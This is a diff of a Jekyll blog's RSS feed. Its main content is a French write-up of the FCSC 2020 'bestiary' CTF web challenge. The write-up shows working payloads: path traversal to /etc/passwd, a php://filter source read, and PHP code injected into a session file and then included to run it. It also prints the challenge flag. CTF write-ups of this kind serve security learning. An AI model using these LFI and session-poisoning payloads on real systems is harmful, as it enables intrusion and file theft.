@@ -3,10 +3,10 @@
   <channel>
     <title>Thomas • Personal blog</title>
     <description>A simple and awesome blog theme powered by jekyll.</description>
-    <link>/</link>
-    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
     <pubDate>2020-05-10</pubDate>
-    <lastBuildDate>Sun, 10 May 2020 13:24:01 +0200</lastBuildDate>
+    <lastBuildDate>Sun, 10 May 2020 14:32:47 +0200</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
     
       <item>
@@ -24,13 +24,16 @@ Le France CyberSecurity Challenge est une compétition en ligne organisée par l
 &lt;p&gt;&lt;img src=&quot;/img/fcsc_home.PNG&quot; alt=&quot;Home&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;On devine assez rapidement que la paramètre ‘monster’ de la requête GET est à injecter.&lt;br /&gt;
-On test un payload classique pour voir s’il est possible d’avoir une LFI : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=../../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
+On test un payload classique pour voir s’il est possible d’avoir une LFI :&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=../../../../etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/img/fcsc_lfi_etc.PNG&quot; alt=&quot;LFI&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;On à donc une LFI :)&lt;br /&gt;
-On tente d’afficher le code source avec un filter PHP.
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=php://filter/convert.base64-encode/resource=index.php&lt;/code&gt;&lt;/p&gt;
+On tente d’afficher le code source avec un filter PHP.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=php://filter/convert.base64-encode/resource=index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;/img/fcsc_bestiary_base.PNG&quot; alt=&quot;Base&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
@@ -106,23 +109,27 @@ On tente d’afficher le code source avec un filter PHP.
 &lt;p&gt;On peut voir le contenu de ma session sur la capture d’écran ci-dessus. &lt;br /&gt;
 Comme en PHP, tout fichier inclut via la fonction &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include()&lt;/code&gt; est traité comme un fichier PHP, on va pouvoir injecter du code PHP dans le cookie PHPSESSID afin de le faire exécuter au serveur lorsque l’on va accéder à la session.&lt;/p&gt;
 
-&lt;p&gt;Je vais utiliser le payload suivant pour lire le fichier contenant le flag : 
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;?php var_dump(file_get_contents(base64_decode('ZmxhZy5waHA='))); ?&amp;gt;&lt;/code&gt;&lt;br /&gt;
-J’ai encodé le nom du fichier en base64 à cause de la fonction &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strpos()&lt;/code&gt; qui détecte si la chaîne “flag” est présente dans le paramètre GET ‘monter’. &lt;br /&gt;
-J’injecte donc ce payload dans ma session en effectuant la requête suivante : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://challenges2.france-cybersecurity-challenge.fr:5004//index.php?monster=%3C?php%20var_dump(file_get_contents(base64_decode(%27ZmxhZy5waHA=%27)));%20?%3E&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Je vais utiliser le payload suivant pour lire le fichier contenant le flag :&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ZmxhZy5waHA='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;J’ai encodé le nom du fichier en base64 à cause de la fonction &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strpos()&lt;/code&gt; qui détecte si la chaîne “flag” est présente dans le paramètre GET ‘monter’. &lt;br /&gt;
+J’injecte donc ce payload dans ma session en effectuant la requête suivante :&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://challenges2.france-cybersecurity-challenge.fr:5004//index.php?monster=%3C?php%20var_dump(file_get_contents(base64_decode(%27ZmxhZy5waHA=%27)));%20?%3E
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;À ce stage, il ne me reste plus qu’à inclure le fichier contenant les informations de ma session, afin que le code PHP soit exécuté.
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://challenges2.france-cybersecurity-challenge.fr:5004//index.php?monster=sessions/sess_c70091bbb2c30521812c43b37040255a&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;À ce stage, il ne me reste plus qu’à inclure le fichier contenant les informations de ma session, afin que le code PHP soit exécuté.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://challenges2.france-cybersecurity-challenge.fr:5004//index.php?monster=sessions/sess_c70091bbb2c30521812c43b37040255a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;On affiche les sources et voilà !&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/img/fcsc_bestiary_flag.PNG&quot; alt=&quot;FLAG&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Flag &lt;strong&gt;FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}&lt;/strong&gt;&lt;/p&gt;
 </description>
         <pubDate>2020-05-10</pubDate>
-        <link>/articles/2020-05/FCSC-2020-bestiary</link>
-        <guid isPermaLink="true">/articles/2020-05/FCSC-2020-bestiary</guid>
+        <link>http://localhost:4000/articles/2020-05/FCSC-2020-bestiary</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2020-05/FCSC-2020-bestiary</guid>
         
         <category>CTF</category>
         
@@ -680,8 +687,8 @@ Le fonctionnement d’un serveur &lt;code class=&quot;language-plaintext highlig
 &lt;p&gt;Je oublié de prendre un screenshot et de noter le flag lorsque j’ai lancé le script, car comme les serveur sont situés au US, et que je suis basé en EU, le temps de latence est impressionnant et j’ai seulement le temps de marquer 4 points, alors que sur l’instance européenne déployée par les admins du Angstrom j’ai pu marquer plus de 30 points et donc d’avoir le flag.&lt;/p&gt;
 </description>
         <pubDate>2020-05-10</pubDate>
-        <link>/articles/2020-03/Angstrom-CTF-web</link>
-        <guid isPermaLink="true">/articles/2020-03/Angstrom-CTF-web</guid>
+        <link>http://localhost:4000/articles/2020-03/Angstrom-CTF-web</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2020-03/Angstrom-CTF-web</guid>
         
         <category>CTF</category>
         
@@ -848,8 +855,8 @@ https://ctf.hexpresso.fr/1ea967f52d1aab327d084efd24d04957
 
 </description>
         <pubDate>2020-05-10</pubDate>
-        <link>/articles/2019-12/CTF-Capture-the-FIC-step3</link>
-        <guid isPermaLink="true">/articles/2019-12/CTF-Capture-the-FIC-step3</guid>
+        <link>http://localhost:4000/articles/2019-12/CTF-Capture-the-FIC-step3</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2019-12/CTF-Capture-the-FIC-step3</guid>
         
         <category>CTF</category>
         
